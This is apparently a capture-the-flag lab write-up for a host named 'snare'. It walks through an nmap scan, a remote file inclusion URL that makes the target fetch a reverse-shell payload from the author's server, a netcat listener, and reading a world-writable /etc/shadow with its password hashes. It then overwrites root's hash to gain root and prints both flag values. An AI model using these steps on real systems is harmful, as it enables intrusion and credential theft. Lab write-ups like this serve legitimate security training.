# Title : 10.150.150.18



## Enumeration


### port scanning 

```sh

$ nmap -sC -sV 10.150.150.18
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 10:02 WAT
Nmap scan report for 10.150.150.18
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:0e:73:d4:ae:73:14:7e:c5:1c:15:84:ef:45:a4:d1 (RSA)
|   256 39:0b:0b:c9:86:c9:8e:b5:2b:0c:39:c7:63:ec:e2:10 (ECDSA)
|_  256 f6:bf:c5:03:5b:df:e5:e1:f4:da:ac:1e:b2:07:88:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Welcome to my homepage!
|_Requested resource was /index.php?page=home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 170.38 seconds


```


- i test for possible vulnerable on this is endpoint `/index.php?page=` which i found it was vulnerable to RFI

- create the payloade via `https://www.revshells.com/`

- use host it, on my system, using python

```sh

$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.150.150.18 - - [26/Aug/2025 18:25:04] "GET /payload.php HTTP/1.0" 200 -

```

```sh
http://10.150.150.18/index.php?page=http://10.66.67.86/payload

```

- i use netcat to catch my shell

```sh

$ nc -lvnp 9001          
listening on [any] 9001 ...
connect to [10.66.67.86] from (UNKNOWN) [10.150.150.18] 60420
Linux snare 5.4.0-53-generic #59-Ubuntu SMP Wed Oct 21 09:38:44 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:25:04 up  3:51,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                17Dec20 1305days  0.06s  0.04s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

 - i use python to stablizer my shelll

 ```bash

python3 -c 'import pty; pty.spawn("/bin/bash")'

 ctrl + z

stty raw -echo && fg

 ```



- i get the first flag

```sh

www-data@snare:/$ cd /home
www-data@snare:/home$ ls
snare
www-data@snare:/home$ cd snare
www-data@snare:/home/snare$ ls
FLAG1.txt
www-data@snare:/home/snare$ cat FLAG1.txt 
e335462da856f39997bffdc04b8d89ce1104fcc5
www-data@snare:/home/snare$ 



```

- to get the root flag we have to do priv escalation

- i manual check if the `/etc/shadow` can be read by my current login user, which i find out it was

```sh

www-data@snare:/home/snare$ cat /etc/shadow
root:$6$b8wkwLbICzuTqPiO$dFLYb8ZNEpfGLRnvODlyGfjtZQTV85FJCDCBGiZEU9b3laym9RJo144xkYEldB419O1Q3E5FARrKRRn/LrtZc0:18586:0:99999:7:::
daemon:*:18474:0:99999:7:::
bin:*:18474:0:99999:7:::
sys:*:18474:0:99999:7:::
sync:*:18474:0:99999:7:::
games:*:18474:0:99999:7:::
man:*:18474:0:99999:7:::
lp:*:18474:0:99999:7:::
mail:*:18474:0:99999:7:::
news:*:18474:0:99999:7:::
uucp:*:18474:0:99999:7:::
proxy:*:18474:0:99999:7:::
www-data:*:18474:0:99999:7:::
backup:*:18474:0:99999:7:::
list:*:18474:0:99999:7:::
irc:*:18474:0:99999:7:::
gnats:*:18474:0:99999:7:::
nobody:*:18474:0:99999:7:::
systemd-network:*:18474:0:99999:7:::
systemd-resolve:*:18474:0:99999:7:::
systemd-timesync:*:18474:0:99999:7:::
messagebus:*:18474:0:99999:7:::
syslog:*:18474:0:99999:7:::
_apt:*:18474:0:99999:7:::
tss:*:18474:0:99999:7:::
uuidd:*:18474:0:99999:7:::
tcpdump:*:18474:0:99999:7:::
landscape:*:18474:0:99999:7:::
pollinate:*:18474:0:99999:7:::
sshd:*:18579:0:99999:7:::
systemd-coredump:!!:18579::::::
snare:$6$H64MOvr/bVP1M3TM$ITTpmiB7QNgv7EARjOcIMgeBvbCXlDOU5LqjA7q0ivXWhevk7HbatblgH7Yc1y8aUo0pnASOhJgjWRlGMsusu/:18586:0:99999:7:::
lxd:!:18579::::::
www-data@snare:/home/snare$ ls -lash  /etc/shadow
4.0K -rwxrwxrwx 1 root shadow 1.1K Aug 27 05:42 /etc/shadow


```

- since we know the `/etc/shadow' is writeable 
- we can create a new password on our machine and and use `vi` to edit and paste the new password there

```sh

$ mkpasswd -m sha-512 123456789 
$6$8u5V5k3jXIOxle7E$UbGDHDgz9Av/ocSJKzymlAI/aeU7uYFOsil/toRdmDOawiCbKSkopLpePQ4myCD.Bef5gvsvvrOCAzmqqLc5j/

```
- after creating it paste it in the target machine 

```sh
www-data@snare:/tmp$ su root        
Password: 
root@snare:/tmp# cd /
root@snare:/# ls
bin    dev   lib    libx32      mnt   root  snap      sys  var
boot   etc   lib32  lost+found  opt   run   srv       tmp
cdrom  home  lib64  media       proc  sbin  swap.img  usr
root@snare:/# cd root
root@snare:~# ls
FLAG2.txt  snap
root@snare:~# cat FLAG2.txt 
2b0286a69b276189afe50517304963e5fa5982d9
root@snare:~# ls -lash  /etc/shadow
4.0K -rwxrwxrwx 1 root shadow 1.1K Aug 27 05:42 /etc/shadow
root@snare:~# 

```


